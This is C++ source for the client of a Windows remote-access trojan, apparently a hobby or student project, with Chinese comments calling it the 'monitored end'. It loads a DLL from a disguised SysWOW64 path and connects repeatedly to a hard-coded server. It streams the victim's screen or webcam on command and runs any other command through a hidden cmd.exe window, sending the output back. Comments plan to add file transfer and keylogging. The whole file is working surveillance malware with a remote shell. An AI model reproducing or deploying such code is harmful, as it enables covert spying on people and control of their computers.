/*被監控端*/ 

#include "stdafx.h"
#include "client.h"
void exeCmd(const char*, int); //執行command line指令

int _tmain(int argc, _TCHAR* argv[])
{
	const char* DllName = "C:\\Windows\\SysWOW64\\networktlist\\dll_opencv.dll"; //測試時可改為當前路徑
	//const char* DllName = "dll_opencv.dll";
	//get dll handle
	//printf("%s\n",path);
	HMODULE dll_opencv = LoadLibraryA(DllName); //載入動態連結庫
	typedef void (*video_monitor)(SOCKET);
	typedef void (*screen_monitor)(SOCKET);
	//get function address and 解析dll獲取的函式
	video_monitor vm=NULL;
	screen_monitor sm=NULL;
	if (dll_opencv != NULL) {
		vm = (video_monitor)GetProcAddress(dll_opencv, "video_monitor");
		sm = (screen_monitor)GetProcAddress(dll_opencv,"screen_monitor");
	}
	else {
		printf("exit1\n");
	}
    //設定winsocket的前置作業
    WORD version;
    WSADATA wsaData;

    int err;
    version = MAKEWORD(2, 2);
    if ((err = WSAStartup(version, &wsaData))) {
        printf("WSAstart error.\n");
        exit(1);
    }

    if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
        printf("Could not find a usable version of Winsock.dll\n");
        WSACleanup();
        return 1;
    }
    else { //socket設置成功
        SOCKET fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in srv;
        srv.sin_family = AF_INET;
        srv.sin_port = htons(1234);
        srv.sin_addr.S_un.S_addr = inet_addr("192.168.43.250");

		while(1){
			if ((connect(fd, (struct sockaddr*) & srv, sizeof(srv))) < 0) {
				printf("connect error.\n");
				//system("pause");
			}
			else break;
		}
       // else {
            while (1)
            {
                char command[1000]="";
                int len;
                int rbytes = recv(fd, (char*)&len, sizeof(int), 0); //接收指令長度
                if (rbytes < 0) break;
                recv(fd, command, 1000, 0); //接收指令
                command[len] = '\0';
                if (!strcmp(command, "exit")) break; //斷開與伺服器的連線
                if (!strcmp(command,"screen")) { //螢幕截圖
					u_long iMode = 1;
					int iResult = ioctlsocket(fd, FIONBIO, &iMode);

					if (iResult != NO_ERROR) printf("ioctlsocket failed with error: %ld\n", iResult);
					sm(fd); //動態連結庫的函式 處理螢幕截圖視頻並將之傳送給伺服器端
                    //socket恢復成blocking
					iMode = 0;
					iResult = ioctlsocket(fd, FIONBIO, &iMode);
					if (iResult != NO_ERROR) printf("ioctlsocket failed with error: %ld\n", iResult);
                }
                else if(!strcmp(command,"monitor")){ //傳送相機視頻
                    //blocking -> nonblocking
                    u_long iMode = 1;
                    int iResult = ioctlsocket(fd, FIONBIO, &iMode);

                    if (iResult != NO_ERROR) printf("ioctlsocket failed with error: %ld\n", iResult);
                    vm(fd); //動態連結庫的函式 處理相機視頻並將之傳送給伺服器端
                    //socket恢復成blocking
                    iMode = 0;
                    iResult = ioctlsocket(fd, FIONBIO, &iMode);
                    if (iResult != NO_ERROR) printf("ioctlsocket failed with error: %ld\n", iResult);
                }
				else{
					printf("%s\n",command); //debug用
                    exeCmd(command, fd); //excute command and send output to server
                    printf("end command\n"); //debug
				}
				//else if(指令){ 處理檔案傳輸 }
				//else if(指令){ 鍵盤側錄 }
            }
            WSACleanup();
            system("pause");
        //}
    }

	return 0;
}
void exeCmd(const char* cmd, int sfd) {
    char cmdPath[1000] = "c:\\windows\\system32\\cmd.exe /C ";
    strcat(cmdPath, cmd);
    //printf("%s\n",cmdPath);
    HANDLE hPipeRead, hPipeWrite;

    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
    saAttr.bInheritHandle = TRUE; // Pipe handles are inherited by child process.
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe to get results from child's stdout.
    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        printf("pipe error\n");
        return;
    }

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;
    si.wShowWindow = SW_HIDE; // Prevents cmd window from flashing.
                              // Requires STARTF_USESHOWWINDOW in dwFlags.

    PROCESS_INFORMATION pi = { 0 };
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    BOOL fSuccess = CreateProcessA(NULL, (LPSTR)cmdPath, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (!fSuccess)
    {
        CloseHandle(hPipeWrite);
        CloseHandle(hPipeRead);
        printf("create process error\n");
        DWORD errCode = GetLastError();
        printf("%lu\n", errCode);
        return;
    }
    bool bProcessEnded = false;
    for (; !bProcessEnded;)
    {
        // Give some timeslice (50 ms), so we won't waste 100% CPU.
        bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;

        // Even if process exited - we continue reading, if
        // there is some data available over pipe.
        for (;;)
        {
            char buf[1024];
            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL)) {
                printf("nothing\n");
                break;
            }

            if (!dwAvail) { // No data available, return
                printf("nothing1\n");
                break;
            }

            if (!::ReadFile(hPipeRead, buf, min(sizeof(buf), dwAvail), &dwRead, NULL) || !dwRead) {
                // Error, the child process might ended
                printf("nothing3\n");
                break;
            }
            //printf("%s", buf);
            
            send(sfd, buf, sizeof(buf), 0);
        }
    } //for
    CloseHandle(hPipeWrite);
    CloseHandle(hPipeRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


